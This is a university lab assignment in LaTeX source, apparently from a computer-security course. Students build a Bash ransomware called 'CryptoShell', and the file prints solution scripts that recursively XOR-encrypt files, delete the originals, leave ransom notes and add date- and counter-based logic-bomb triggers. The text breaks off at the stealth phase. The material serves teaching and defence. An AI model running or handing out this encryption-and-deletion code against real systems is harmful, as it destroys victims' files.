@@ -1,0 +1,1080 @@
+\documentclass[a4paper,11pt]{article}
+
+\usepackage{fullpage}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+\usepackage{graphicx}
+\usepackage{latexsym}
+\usepackage{float}
+\usepackage{comment}
+\usepackage{array}
+\usepackage{booktabs}
+
+% --- Packages for pedagogical enrichment ---
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage[most]{tcolorbox}
+\usepackage{hyperref}
+
+%%%%%%%%%%%%%%% LISTINGS CONFIGURATION %%%%%%%%%%%%%%%%%%%
+
+\definecolor{codegreen}{rgb}{0.25,0.49,0.25}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{codered}{rgb}{0.7,0.1,0.1}
+\definecolor{codeblue}{rgb}{0.0,0.0,0.7}
+\definecolor{backcolour}{rgb}{0.97,0.97,0.97}
+
+\lstset{
+    language=bash,
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen}\itshape,
+    keywordstyle=\color{codeblue}\bfseries,
+    stringstyle=\color{codered},
+    basicstyle=\ttfamily\small,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=8pt,
+    numberstyle=\tiny\color{codegray},
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=4,
+    frame=single,
+    rulecolor=\color{codegray},
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+    literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1 {î}{{\^i}}1 {ô}{{\^o}}1 {ç}{{\c{c}}}1 {É}{{\'E}}1 {—}{{---}}1 {ë}{{\"e}}1
+}
+
+%%%%%%%%%%%%%%% TCOLORBOX ENVIRONMENTS %%%%%%%%%%%%%%%%%%
+
+% Course reminder (light blue)
+\newtcolorbox{rappel}[1][]{
+    colback=blue!5!white,
+    colframe=blue!50!black,
+    fonttitle=\bfseries,
+    title={\large Course Reminder},
+    #1
+}
+
+% Key point (light green)
+\newtcolorbox{pointcle}[1][]{
+    colback=green!5!white,
+    colframe=green!40!black,
+    fonttitle=\bfseries,
+    title={Key Point},
+    #1
+}
+
+% Warning (light orange)
+\newtcolorbox{attention}[1][]{
+    colback=orange!8!white,
+    colframe=orange!60!black,
+    fonttitle=\bfseries,
+    title={Warning},
+    #1
+}
+
+% Ethical warning (red)
+\newtcolorbox{ethique}[1][]{
+    colback=red!5!white,
+    colframe=red!60!black,
+    fonttitle=\bfseries\large,
+    title={Ethical and Legal Warning},
+    #1
+}
+
+%%%%%%%%%%%%%%% COMMANDS %%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\itemb}{\item[$\bullet$]}
+
+\newcommand{\Ki}{\mathcal{K}}
+\newcommand{\Ci}{\mathcal{C}}
+\newcommand{\Mi}{\mathcal{M}}
+\newcommand{\Ei}{\mathcal{E}}
+\newcommand{\Di}{\mathcal{D}}
+
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\Znat}{\mathbb{Z}}
+\newcommand{\Nnat}{\mathbb{N}}
+
+%%%%%%%%%%%%%%% ENVIRONMENTS %%%%%%%%%%%%%%%%%%%%%%%
+
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemma}
+\newtheorem{algorithme}{Algorithm}
+\newtheorem{corolaire}{Corollary}
+\newtheorem{propriete}{Property}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme}{Theorem}
+\newtheorem{definition}{Definition}
+%\newtheorem{correction}{Solution}
+\excludecomment{correction}
+
+\theoremstyle{definition}
+\newtheorem*{probleme}{Problem}
+\newtheorem*{cout}{Cost}
+\newtheorem*{fait}{Fact}
+\newtheorem*{notation}{Notation}
+\newtheorem*{complexite}{Complexity}
+\newtheorem{exercice}{Exercise}
+\newtheorem{remarque}{Remark}
+\newtheorem{exemple}{Example}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue!60!black,
+    urlcolor=blue!60!black
+}
+
+%%%%%%%%%%%%%% DOCUMENT %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\begin{document}
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{University of Perpignan} \hfill  L3 Computer Science \\
+ \hfill C. Legrand \hfill  Year \the\year  \\
+\smallskip
+\begin{center}
+{
+ {\scshape \large Graded Lab -- Computer Security}  \\
+ CryptoShell Project -- Educational Ransomware in Bash
+}
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
+
+\bigskip
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PRACTICAL INFORMATION
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\noindent\fbox{\parbox{\textwidth}{
+\textbf{Practical Information:}
+\begin{itemize}
+    \item \textbf{Distribution:} February 16, 2026
+    \item \textbf{Deadline:} March 8, 2026 at 11:59 PM on Moodle
+    \item \textbf{Instructions:} \textbf{Individual} work. Submit a \texttt{.zip} archive on Moodle containing:
+    \begin{itemize}
+        \item All Bash scripts (Phases 1--6)
+        \item The analysis report (Phase 7) in PDF format
+    \end{itemize}
+    \item \textbf{Grading:} 25 points scaled to /20. Each phase is graded independently.
+\end{itemize}
+}}
+
+\bigskip
+
+% --- Ethical warning ---
+\begin{ethique}
+The techniques presented in this lab are studied in a \textbf{strictly academic context} in order to understand the mechanisms used by malicious software and thus be better able to defend against them.
+
+\textbf{Any use of these techniques outside the educational context is illegal} and subject to criminal penalties (Chapter III of the French Penal Code, Articles 323-1 to 323-8 -- \textit{Offences against automated data processing systems}):
+\begin{itemize}
+    \item Unauthorized access to or remaining in an ADPS (Art.~323-1): \textbf{3 years} imprisonment and \textbf{\texteuro{}100,000} fine
+    \item Obstruction of an ADPS (Art.~323-2): \textbf{5 years} imprisonment and \textbf{\texteuro{}150,000} fine
+    \item Fraudulent introduction of data into an ADPS (Art.~323-3): \textbf{5 years} imprisonment and \textbf{\texteuro{}150,000} fine
+\end{itemize}
+Penalties increased to \textbf{7 years} and \textbf{\texteuro{}300,000} when the targeted system processes personal data operated by the State, and up to \textbf{10 years} and \textbf{\texteuro{}300,000} for organized crime (Art.~323-4-1). \textit{Penalties updated by LOPMI Act No.~2023-22 of January 24, 2023.}
+\end{ethique}
+
+\bigskip
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% INTRODUCTION
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\noindent
+\textbf{Scenario:} You are a junior analyst in an incident response team (\textit{CERT}). Your manager asks you to understand how a recent ransomware targeting Linux servers works, then to develop the corresponding detection and recovery tools. To do this, you will \textbf{progressively build} an educational ransomware in Bash, called \textbf{CryptoShell}, then \textbf{switch perspective} to create the countermeasures.
+
+\medskip
+\noindent\textbf{Prerequisites:} Chapters 01 (malicious software) and 02 (interpreted viruses), Labs 01 to 04.
+
+\bigskip
+
+{\Large Working Method:} For each phase, proceed as follows:
+\begin{itemize}
+\item Run \texttt{setup\_lab.sh} to create a clean test environment.
+\item Work \textbf{only} in the \texttt{lab/} directory created by the script.
+\item Test each phase \textbf{before} moving on to the next one.
+\item Recreate the test environment between phases if necessary.
+\end{itemize}
+
+\medskip
+\noindent\textbf{Provided files:}
+\begin{itemize}
+    \item \texttt{xor\_helper.sh} --- Helper script containing \texttt{generate\_key()} and \texttt{xor\_file()} functions (use with \texttt{source})
+    \item \texttt{setup\_lab.sh} --- Test environment setup script
+    \item \texttt{cible1.txt}, \texttt{cible2.txt}, \texttt{cible3.sh} --- Test target files
+    \item \texttt{rapport\_template.tex} --- Analysis report template (Phase 7)
+\end{itemize}
+
+\medskip
+\noindent\textbf{XOR Helper} (\texttt{xor\_helper.sh}) --- this script is provided as a black box:
+\begin{lstlisting}[title=xor\_helper.sh (provided)]
+#!/bin/bash
+# CryptoShell XOR Helper
+# Usage: source xor_helper.sh
+
+# Generate a random key of N bytes (in hex)
+generate_key() {
+    local length=${1:-8}
+    head -c "$length" /dev/urandom | xxd -p
+}
+
+# Encrypt/decrypt a file with an XOR key (in hex)
+# Usage: xor_file <input_file> <output_file> <hex_key>
+xor_file() {
+    local input="$1" output="$2" key="$3"
+    local key_len=${#key}
+    local i=0
+    xxd -p "$input" | tr -d '\n' | fold -w2 | while read byte; do
+        local ki=$(( i % (key_len / 2) ))
+        local key_byte="${key:$((ki*2)):2}"
+        printf "%02x" $(( 16#$byte ^ 16#$key_byte ))
+        i=$((i + 1))
+    done | xxd -r -p > "$output"
+}
+\end{lstlisting}
+
+\bigskip
+\noindent\textbf{Detailed Grading:}
+\begin{center}
+\begin{tabular}{clccc}
+\toprule
+\textbf{Phase} & \textbf{Title} & \textbf{Duration} & \textbf{Points} & \textbf{Difficulty} \\
+\midrule
+1 & Reconnaissance & 30 min & 3 pts & $\star\star$ \\
+2 & XOR Encryption & 45 min & 4 pts & $\star\star\star$ \\
+3 & Propagation \& Ransom & 45 min & 4 pts & $\star\star\star$ \\
+4 & Trigger & 30 min & 3 pts & $\star\star$ \\
+5 & Stealth & 30 min & 3 pts & $\star\star\star$ \\
+6 & Detection \& Recovery & 45 min & 4 pts & $\star\star\star$ \\
+7 & Analysis Report & 45 min & 4 pts & $\star\star\star\star$ \\
+\midrule
+& \textbf{Total} & \textbf{$\sim$4h30} & \textbf{25 pts $\to$ /20} & \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\bigskip
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SINGLE EXERCISE: CryptoShell Project
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[CryptoShell Project --- Educational Ransomware]$\;$
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 1: Reconnaissance
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 1 --- Reconnaissance and File Discovery \hfill \normalsize [3 points]}
+
+\begin{rappel}
+\textbf{Adleman's Classification and Virus Life Cycle:}
+
+Leonard Adleman (1988) proposed a formal classification of malicious programs:
+\begin{itemize}
+    \item \textbf{Simple programs:} execute their action without reproducing (logic bomb, pure ransomware, spyware).
+    \item \textbf{Self-reproducing programs:} copy themselves into other programs or systems (viruses, worms).
+\end{itemize}
+
+\medskip
+The \textbf{life cycle} of a virus has 3 phases:
+\begin{enumerate}
+    \item \textbf{Infection:} the virus copies itself into new hosts (search routine + copy)
+    \item \textbf{Incubation:} the virus is present but inactive (waiting for the trigger)
+    \item \textbf{Disease:} the payload executes (destructive action)
+\end{enumerate}
+
+\medskip
+The \textbf{file search routine} is the first step of any file-targeting malware. It determines the \textbf{scope} of the attack: the more efficient it is (recursive, multi-extension), the greater the impact.
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{1a)}] Write a script \texttt{recon.sh} that takes a directory as argument and lists all \texttt{.txt} and \texttt{.dat} files it contains (recursively). For each file, display: the path, size in bytes, and modification date. Use \texttt{find} or a recursive loop.
+
+\item[\textbf{1b)}] Modify the script so that the total number of files found and the total size are computed. Store the target file list in a file \texttt{targets.list}.
+
+\item[\textbf{1c)}] \textbf{Theoretical question:} In Adleman's classification, where does ransomware fit? Is it a simple or self-reproducing program? Justify.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{1a+1b)} Reconnaissance script:
+\begin{lstlisting}[title=recon.sh (phase1\_recon.sh)]
+#!/bin/bash
+# CryptoShell — Phase 1: Reconnaissance
+TARGET_DIR="${1:-.}"
+TARGETS_FILE="targets.list"
+echo "# CryptoShell Target List — $(date)" > "$TARGETS_FILE"
+echo "# Format: SIZE DATE PATH" >> "$TARGETS_FILE"
+
+echo "=== CryptoShell Recon ==="
+echo "Scanning: $TARGET_DIR"
+
+find "$TARGET_DIR" -type f \( -name "*.txt" -o -name "*.dat" \) | while read filepath; do
+    SIZE=$(stat --format="%s" "$filepath" 2>/dev/null || stat -f "%z" "$filepath" 2>/dev/null)
+    MDATE=$(stat --format="%y" "$filepath" 2>/dev/null || stat -f "%Sm" "$filepath" 2>/dev/null)
+    echo "$SIZE $MDATE $filepath"
+    echo "$SIZE $MDATE $filepath" >> "$TARGETS_FILE"
+done
+
+TOTAL_FILES=$(grep -c -v "^#" "$TARGETS_FILE")
+TOTAL_SIZE=$(grep -v "^#" "$TARGETS_FILE" | awk '{sum += $1} END {print sum+0}')
+echo "--- Summary ---"
+echo "Total files found: $TOTAL_FILES"
+echo "Total size: $TOTAL_SIZE bytes"
+echo "Target list saved to: $TARGETS_FILE"
+\end{lstlisting}
+
+\textbf{1c)} In Adleman's classification, a \textbf{pure ransomware} is a \textbf{simple program} (non-self-reproducing). It does not copy itself into other programs: it encrypts the victim's files and demands a ransom, but does not propagate on its own.
+
+However, ransomware can be \textbf{coupled} with a virus or worm for propagation (e.g., WannaCry = ransomware + worm). In that case, the propagation component is self-reproducing, but the ransomware component (encryption + ransom) remains a simple program.
+
+\begin{pointcle}
+\begin{itemize}
+    \item Recursive file search (\texttt{find} with \texttt{-name}) is the first step of ANY file-targeting malware.
+    \item A pure ransomware is a \textbf{simple program} in Adleman's classification --- it does not self-reproduce.
+    \item The attack scope depends directly on the search routine: recursive $\to$ maximum impact.
+    \item \texttt{stat} extracts file metadata (size, dates).
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 2: XOR Encryption
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 2 --- XOR Encryption \hfill \normalsize [4 points]}
+
+\begin{rappel}
+\textbf{XOR Encryption and Viral Polymorphism:}
+
+XOR (exclusive or) has 4 fundamental algebraic properties:
+\begin{enumerate}
+    \item \textbf{Commutativity:} $A \oplus B = B \oplus A$
+    \item \textbf{Associativity:} $(A \oplus B) \oplus C = A \oplus (B \oplus C)$
+    \item \textbf{Identity element:} $A \oplus 0 = A$
+    \item \textbf{Self-inverse:} $A \oplus A = 0$
+\end{enumerate}
+
+\medskip
+\textbf{Consequence for encryption:} If $C = M \oplus K$ (encryption), then $C \oplus K = M \oplus K \oplus K = M \oplus 0 = M$ (decryption). The \textbf{same operation} with the \textbf{same key} encrypts AND decrypts.
+
+\medskip
+\textbf{Link with Vernam cipher:} XOR with a key as long as the message and truly random constitutes the \textbf{one-time pad}, proven unbreakable by Shannon (1949).
+
+\medskip
+\textbf{Viral polymorphism via XOR encryption:} In a polymorphic virus, the viral code is encrypted with a different XOR key at each infection. Only the \textbf{decryption routine} (in cleartext) remains constant --- it is a \textbf{detectable invariant}.
+
+\medskip
+\textbf{XOR Truth Table:}
+\begin{center}
+\begin{tabular}{cc|c}
+$A$ & $B$ & $A \oplus B$ \\
+\midrule
+0 & 0 & 0 \\
+0 & 1 & 1 \\
+1 & 0 & 1 \\
+1 & 1 & 0 \\
+\end{tabular}
+\end{center}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{2a)}] Explain mathematically why XOR can both encrypt AND decrypt with the same operation and the same key. Give the 4 algebraic properties used.
+
+\item[\textbf{2b)}] Manually compute the XOR of the string \texttt{"HACK"} with key \texttt{0x5A}. Provide the full table (character, ASCII hex, key hex, result hex, result character).
+
+\item[\textbf{2c)}] Using \texttt{xor\_helper.sh}, write a script \texttt{encrypt.sh} that: (1) generates a random 8-byte key, (2) encrypts a file given as argument, (3) renames the encrypted file with \texttt{.locked} extension, (4) deletes the original, (5) saves the key in a hidden file \texttt{.cryptoshell\_key}.
+
+\item[\textbf{2d)}] Write \texttt{decrypt.sh} that: reads the key from \texttt{.cryptoshell\_key}, decrypts a \texttt{.locked} file, restores the original name, and deletes the \texttt{.locked} file.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{2a)} XOR can encrypt and decrypt with the same operation thanks to the following properties:
+\begin{itemize}
+    \item \textbf{Self-inverse:} $A \oplus A = 0$ for all $A$
+    \item \textbf{Identity element:} $A \oplus 0 = A$ for all $A$
+    \item \textbf{Associativity:} $(A \oplus B) \oplus C = A \oplus (B \oplus C)$
+    \item \textbf{Commutativity:} $A \oplus B = B \oplus A$
+\end{itemize}
+
+\textbf{Proof:} Let $M$ be the message, $K$ the key, $C$ the ciphertext.
+\[C = M \oplus K \quad \Rightarrow \quad C \oplus K = (M \oplus K) \oplus K = M \oplus (K \oplus K) = M \oplus 0 = M\]
+Decryption is identical to encryption: $D(C, K) = C \oplus K = M$.
+
+\medskip
+\textbf{2b)} XOR computation for \texttt{"HACK"} with key \texttt{0x5A}:
+
+\begin{center}
+\begin{tabular}{ccccc}
+\toprule
+\textbf{Character} & \textbf{ASCII (hex)} & \textbf{Key (hex)} & \textbf{Result (hex)} & \textbf{Result (char)} \\
+\midrule
+\texttt{H} & \texttt{0x48} & \texttt{0x5A} & \texttt{0x12} & (non-printable) \\
+\texttt{A} & \texttt{0x41} & \texttt{0x5A} & \texttt{0x1B} & (ESC) \\
+\texttt{C} & \texttt{0x43} & \texttt{0x5A} & \texttt{0x19} & (non-printable) \\
+\texttt{K} & \texttt{0x4B} & \texttt{0x5A} & \texttt{0x11} & (non-printable) \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\textit{Verification:} \texttt{0x48 XOR 0x5A = 01001000 XOR 01011010 = 00010010 = 0x12}. \\
+\textit{Decryption:} \texttt{0x12 XOR 0x5A = 00010010 XOR 01011010 = 01001000 = 0x48 = 'H'} $\checkmark$
+
+\medskip
+\textbf{2c)} Encryption script:
+\begin{lstlisting}[title=encrypt.sh]
+#!/bin/bash
+source xor_helper.sh
+KEY_FILE=".cryptoshell_key"
+input="$1"
+if [ ! -f "$input" ]; then
+    echo "Error: file '$input' not found."; exit 1
+fi
+KEY=$(generate_key 8)
+xor_file "$input" "${input}.locked" "$KEY"
+rm -f "$input"
+echo "$KEY" > "$KEY_FILE"
+echo "[+] Encrypted: ${input}.locked"
+echo "[+] Key saved in $KEY_FILE"
+\end{lstlisting}
+
+\textbf{2d)} Decryption script:
+\begin{lstlisting}[title=decrypt.sh]
+#!/bin/bash
+source xor_helper.sh
+KEY_FILE=".cryptoshell_key"
+input="$1"
+if [ ! -f "$input" ]; then
+    echo "Error: file '$input' not found."; exit 1
+fi
+if [ ! -f "$KEY_FILE" ]; then
+    echo "Error: key not found ($KEY_FILE)."; exit 1
+fi
+KEY=$(cat "$KEY_FILE")
+original="${input%.locked}"
+xor_file "$input" "$original" "$KEY"
+rm -f "$input"
+echo "[+] Decrypted: $original"
+\end{lstlisting}
+
+\begin{attention}
+With a single-byte key, there are only 255 possible variants (0x01 to 0xFF, 0x00 being the identity element). \textbf{Brute-force} is trivial. An 8-byte key offers $256^8 \approx 1.8 \times 10^{19}$ possibilities --- sufficient to resist simple brute-force.
+\end{attention}
+
+\begin{pointcle}
+\begin{itemize}
+    \item XOR is at the heart of both \textbf{viral polymorphism} and \textbf{ransomware}. In a polymorphic virus, the decryption routine (in cleartext) remains a \textbf{detectable invariant}. In ransomware, the encryption key is the \textbf{ransom leverage}.
+    \item \texttt{generate\_key()} uses \texttt{/dev/urandom}: a cryptographic pseudo-random source on Linux.
+    \item The \texttt{.cryptoshell\_key} file starts with a dot: it is \textbf{hidden} from \texttt{ls} (but not from \texttt{ls -a}).
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 3: Propagation and Ransom
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 3 --- Propagation and Ransom \hfill \normalsize [4 points]}
+
+\begin{rappel}
+\textbf{Classic Infection Techniques and Anti-reinfection:}
+
+Classic viruses use 3 main file infection techniques:
+\begin{itemize}
+    \item \textbf{Overwriting:} the virus replaces the beginning of the host file (destructive, simple)
+    \item \textbf{Appending:} the virus appends itself after the host code (non-destructive)
+    \item \textbf{Companion:} the virus creates a file with the same name but higher execution priority
+\end{itemize}
+
+\medskip
+\textbf{Text diagram before/after appending infection:}
+\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white},language={}]
+BEFORE:                    AFTER:
++------------------+       +------------------+
+| Host code        |       | Host code        |
+| (original)       |       | (original)       |
++------------------+       +------------------+
+                            | Viral code       |
+                            | (appended)       |
+                            +------------------+
+\end{lstlisting}
+
+\medskip
+\textbf{Anti-reinfection:} A virus must avoid reinfecting an already-infected file. Strategies: marker (signature), tail comparison, execution test.
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{3a)}] Write \texttt{cryptoshell.sh} that: (1) generates a random key, (2) recursively traverses a target directory, (3) encrypts each \texttt{.txt} and \texttt{.dat} file found, (4) renames to \texttt{.locked}, (5) deposits a \texttt{RANSOM\_NOTE.txt} file in each directory containing encrypted files.
+
+\item[\textbf{3b)}] Add an \textbf{anti-reinfection} mechanism: the script must NOT re-encrypt an already \texttt{.locked} file. Implement this check.
+
+\item[\textbf{3c)}] The ransom note must contain: a threatening message, a unique victim identifier (randomly generated), and (fictitious) instructions. Write the \texttt{create\_ransom\_note()} function.
+
+\item[\textbf{3d)}] \textbf{Theoretical question:} Compare the ransomware infection technique with the 3 classic virus techniques (overwriting, appending, companion). What are the fundamental similarities and differences?
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{3a+3b+3c)} The complete ransomware:
+\begin{lstlisting}[title=cryptoshell.sh (phase3\_ransom.sh)]
+#!/bin/bash
+# CryptoShell — Phase 3: Propagation and Ransom
+source xor_helper.sh
+TARGET_DIR="${1:-.}"
+KEY_FILE=".cryptoshell_key"
+VICTIM_ID=$(head -c 8 /dev/urandom | xxd -p)
+
+KEY=$(generate_key 8)
+echo "$KEY" > "$KEY_FILE"
+
+create_ransom_note() {
+    local dir="$1"
+    cat > "${dir}/RANSOM_NOTE.txt" << EOF
+============================================
+    CRYPTOSHELL — YOUR FILES ARE ENCRYPTED
+============================================
+Victim ID: ${VICTIM_ID}
+Send 0.5 BTC to [FAKE ADDRESS — EDUCATIONAL LAB]
+Contact: cryptoshell@fake-educational.example
+[This is an educational exercise]
+============================================
+EOF
+}
+
+echo "[CryptoShell] Encrypting..."
+find "$TARGET_DIR" -type f \( -name "*.txt" -o -name "*.dat" \) | while read filepath; do
+    case "$filepath" in *.locked) continue ;; esac
+    [ "$(basename "$filepath")" = "RANSOM_NOTE.txt" ] && continue
+    xor_file "$filepath" "${filepath}.locked" "$KEY"
+    rm -f "$filepath"
+    echo "  [+] $(basename "$filepath") -> $(basename "$filepath").locked"
+    DIR=$(dirname "$filepath")
+    if [ ! -f "${DIR}/RANSOM_NOTE.txt" ]; then
+        create_ransom_note "$DIR"
+    fi
+done
+echo "[CryptoShell] Encryption complete. ID: $VICTIM_ID"
+\end{lstlisting}
+
+\textbf{3d)} Comparison of ransomware vs. classic techniques:
+
+\begin{center}
+\begin{tabular}{lp{5.5cm}p{5.5cm}}
+\toprule
+\textbf{Technique} & \textbf{Action on file} & \textbf{Reversibility} \\
+\midrule
+\textbf{Overwriting} & Replaces content with viral code & Irreversible (data destroyed) \\
+\textbf{Appending} & Adds viral code at end & Reversible (remove appended code) \\
+\textbf{Companion} & Does not modify original file & Reversible (delete companion) \\
+\textbf{Ransomware} & Replaces content with encrypted version & Reversible \textbf{if} key is known \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\textbf{Similarities:} Like the overwriting virus, ransomware \textbf{replaces} file content. Like the appending virus, it uses an \textbf{anti-reinfection} mechanism (checking the \texttt{.locked} extension).
+
+\textbf{Fundamental differences:} (1) Ransomware does not \textbf{append} itself --- it replaces content with an encrypted version. (2) Ransomware does not \textbf{spread} into executables --- it targets \textbf{data}. (3) Reversibility depends on the \textbf{key}: this is the economic leverage of ransomware.
+
+\begin{pointcle}
+\begin{itemize}
+    \item Ransomware does not ``append'' to files like a classic virus --- it \textbf{replaces} content with an encrypted version.
+    \item The anti-reinfection mechanism is analogous: checking the \texttt{.locked} extension plays the same role as an infection marker in a virus.
+    \item The victim identifier (\texttt{VICTIM\_ID}) allows the attacker to associate a payment with a decryption key.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 4: Trigger
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 4 --- Trigger (Logic Bomb) \hfill \normalsize [3 points]}
+
+\begin{rappel}
+\textbf{Logic Bombs and Triggers:}
+
+A \textbf{logic bomb} is a program whose payload only activates when a \textbf{condition} is met. Types of triggers:
+\begin{itemize}
+    \item \textbf{Temporal:} date, time, day of the week
+    \item \textbf{Counter-based:} after $N$ executions
+    \item \textbf{Event-driven:} file presence, network connection, user login
+    \item \textbf{Environmental:} environment variables, machine name
+\end{itemize}
+
+\medskip
+\textbf{Useful commands:}
+\begin{itemize}
+    \item \texttt{date +\%u}: day of the week (1=Monday, \ldots, 7=Sunday)
+    \item \texttt{date +\%d}: day of the month (01--31)
+    \item \texttt{date +\%m}: month (01--12)
+\end{itemize}
+
+\medskip
+\textbf{Historical examples:} Omega Engineering (1996) --- a fired system administrator planted a logic bomb that deleted all production software 20 days after his departure. Dark Seoul (2013) --- malware activated at a precise date/time targeting South Korean banks and media.
+
+\medskip
+\textit{Link with viruses:} A virus with a delayed trigger is a logic bomb mounted on a viral vector. The trigger/payload separation is a \textbf{fundamental architectural pattern}.
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{4a)}] Modify \texttt{cryptoshell.sh} so that encryption only activates if a \textbf{temporal condition} is met: the script must check if it is a Sunday (\texttt{date +\%u} returns 7). Otherwise, the script exits silently.
+
+\item[\textbf{4b)}] Implement an \textbf{alternative counter-based trigger}: a hidden file \texttt{.cs\_count} is incremented at each execution. Encryption only activates after 5 executions. After activation, the counter is deleted.
+
+\item[\textbf{4c)}] \textbf{Theoretical question:} Name two famous historical examples of logic bombs. Explain why antivirus software has difficulty detecting logic bombs before they trigger.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{4a)} Temporal trigger (Sunday) --- code to add at the beginning of the script:
+\begin{lstlisting}[title=Temporal trigger]
+# Temporal trigger: Sunday only
+DAY=$(date +%u)
+if [ "$DAY" -ne 7 ]; then
+    exit 0   # Not Sunday -> silent exit
+fi
+\end{lstlisting}
+
+\textbf{4b)} Counter-based trigger:
+\begin{lstlisting}[title=Counter-based trigger]
+# Counter-based trigger
+COUNTER_FILE=".cs_count"
+count=0
+if [ -f "$COUNTER_FILE" ]; then
+    count=$(cat "$COUNTER_FILE")
+fi
+count=$((count + 1))
+echo "$count" > "$COUNTER_FILE"
+if [ "$count" -lt 5 ]; then
+    exit 0   # Not yet 5 executions
+fi
+# Activation! Delete the counter
+rm -f "$COUNTER_FILE"
+\end{lstlisting}
+
+\textbf{4c)} Historical examples:
+\begin{itemize}
+    \item \textbf{Omega Engineering (1996):} Timothy Lloyd, a fired system administrator, planted a logic bomb activated 20 days after his departure. It deleted all design and production software, causing $\sim$\$10 million in damages.
+    \item \textbf{Dark Seoul / Jokra (2013):} Malware activated on March 20, 2013 at exactly 2:00 PM, simultaneously targeting 3 banks and 2 TV stations in South Korea. It erased the MBR of hard drives.
+\end{itemize}
+
+\textbf{Detection difficulty:} Antivirus software has difficulty detecting logic bombs \textit{before} they trigger because:
+\begin{enumerate}
+    \item The bomb's code is \textbf{legitimate code} (an \texttt{if} condition and an action) --- no characteristic viral signature.
+    \item The payload can use \textbf{legitimate APIs} (file deletion, formatting).
+    \item Static analysis cannot predict whether the condition will be met.
+    \item Only \textbf{behavioral analysis at runtime} (sandboxing) could detect it, but it requires simulating the right trigger conditions.
+\end{enumerate}
+
+\begin{attention}
+In C, the \texttt{tm\_mon} field of \texttt{struct tm} is indexed from 0 (January=0, December=11) --- a classic trap from Lab 02. In Bash, \texttt{date +\%u} returns 1=Monday to 7=Sunday, with no indexing trap.
+\end{attention}
+
+\begin{pointcle}
+\begin{itemize}
+    \item The \textbf{separation} between trigger and payload is a fundamental security pattern. The same trigger can activate different payloads, and the same payload can be triggered by different conditions.
+    \item The \texttt{.cs\_count} file is an \textbf{Indicator of Compromise} (IoC): its presence signals a logic bomb in the incubation phase.
+    \item Logic bombs are hard to detect because they use \textbf{functionally legitimate code} --- only the \textbf{intent} is malicious.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 5: Stealth
